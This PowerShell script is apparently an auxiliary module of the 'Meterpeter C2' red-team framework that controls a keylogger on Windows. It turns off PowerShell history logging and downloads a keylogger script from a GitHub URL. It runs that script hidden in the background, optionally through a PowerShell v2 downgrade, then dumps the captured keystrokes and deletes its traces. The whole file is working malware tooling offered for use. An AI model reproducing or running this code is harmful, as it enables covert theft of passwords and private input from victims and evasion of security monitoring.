<#
.SYNOPSIS
   Meterpeter C2 v2.10.12 keylogger start|stop

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: mscore.ps1 {auto-download}
   Optional Dependencies: void.log, pid.log {auto-build}
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   Aux module of Meterpeter C2 to capture keystrokes

.NOTES
   This cmdlet does not depend of meterpeter C2 to
   start|stop the capture of keyboard keystrokes.

   Remark: mscore.ps1 cmdlet ( keylogger ) creates the
   void.log + pid.log that this cmdlet requires to work,
   and its executed by this cmdlet in background process.

   Remark: mscore.ps1 captures keystrokes until is process
   its manualy stoped, if target machine its restarted or
   if keymanager.ps1 its invoked with -action 'stop' arg.

.Parameter action
   Accepts arguments: start, stop (default: start)

.Parameter UsePS2
   Use PS version 2 to exec keylogger? (default: false)
  
.EXAMPLE
   PS C:\> .\keymanager.ps1 -action 'start'
   Capture keystrokes until -action 'stop' its invoked

.EXAMPLE
   PS C:\> .\keymanager.ps1 -action 'start' -useps2 'true'
   Capture keystrokes (PS v2) until -action 'stop' its invoked

.EXAMPLE
   PS C:\> .\keymanager.ps1 -action 'stop'
   Stop keylogger process and dump keystrokes on console

.INPUTS
   None. You cannot pipe objects into keymanager.ps1

.OUTPUTS
   * Keylogger is working with ID: 1822
     => Press CTRL+C to stop process ..
   * Total Number of Keystrokes: 23
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Action="start",
   [string]$UsePS2="false"
)


#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null


IF($Action -ieq "start")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download\Execute mscore.ps1 (keylogger)

   .NOTES
      mscore.ps1 cmdlet (keylogger) creates void.log
      and pid.log that this function requires to work.
   #>

   If(-not(Test-Path -Path "$Env:TMP\mscore.ps1"))
   {
      #Download cmdlet from my github repository
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/mscore.ps1" -OutFile "$Env:TMP\mscore.ps1"|Unblock-File
   }

   If($UsePS2 -ieq "true")
   {

      powershell -version 2 -C echo ps2versionfound|Out-File "$Env:TMP\downgradeatt.log" -Force
      $TestDowngradeAtt = Get-Content -Path "$Env:TMP\downgradeatt.log"|Select-String "ps2versionfound"
      Remove-Item -Path "$Env:TMP\downgradeatt.log" -Force
      If($TestDowngradeAtt -iMatch '^(ps2versionfound)$')
      {
         #Use powershell version 2 to execute keylogger
         $cmdlineToExec = "powershell -version 2 -C Import-Module -Name `$Env:TMP\mscore.ps1 -Force"
      }
      Else
      {
         #Defaul keylogger execution function
         $cmdlineToExec = "Import-Module -Name `$Env:TMP\mscore.ps1 -Force"         
      }
   }
   Else
   {
      #Defaul keylogger execution function
      $cmdlineToExec = "Import-Module -Name `$Env:TMP\mscore.ps1 -Force"   
   }

   If(Test-Path -Path "$Env:TMP\mscore.ps1")
   {
      #Start keylogger process in background
      Start-Process -WindowStyle Hidden powershell -ArgumentList "$cmdlineToExec"
      If($?)
      {
         Start-Sleep -Milliseconds 1700 #Give some time for log creation
         $PPID = Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' }
         write-host "`n * Keylogger process started with ID: $PPID" -ForegroundColor Green
      }
      Else
      {
         write-host "`n x Error: fail to start Keylogger background process .." -ForegroundColor Red -BackgroundColor Black
      }
   }
   Else
   {
      write-host "`n x Error: '$Env:TMP\mscore.ps1' missing.." -ForegroundColor Red -BackgroundColor Black
   }
}


IF($Action -ieq "stop")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Stop\Dump keylogger process\keystrokes

   .NOTES
      mscore.ps1 cmdlet (keylogger) creates void.log
      and pid.log that this function requires to work.
   #>

   If(Test-Path -Path "$Env:TMP\pid.log")
   {
      #Get keylogger PPID from logfile
      $PPID = Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' }
      #Stop keylogger process by is PPID
      Stop-Process -Id $PPID -Force
      If($?)
      {
         write-host "`n* Keylogger process '$PPID' stoped." -ForegroundColor Green
      }
      Else
      {
         write-host "`nx Error: fail to stop Keylogger process id: '$PPID'" -ForegroundColor Red -BackgroundColor Black
      }
   }
   Else
   {
      write-host "`nx Error: fail to retrieve keylogger process ID" -ForegroundColor Red -BackgroundColor Black
   }


   #Get the KeyStrokes
   write-host "`nKeylogger Keystrokes Capture" -ForegroundColor Yellow
   write-host "----------------------------"
   If(Test-Path -Path "$Env:TMP\void.log")
   {
      Get-Content -Path "$Env:TMP\void.log"
   }
   Else
   {
      write-host "x Error: '$Env:TMP\void.log' missing" -ForegroundColor Red -BackgroundColor Black   
   }

   #Clean all artifacts left behind
   Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
   Remove-Item -Path "$Env:TMP\void.log" -Force
   Remove-Item -Path "$Env:TMP\pid.log" -Force
}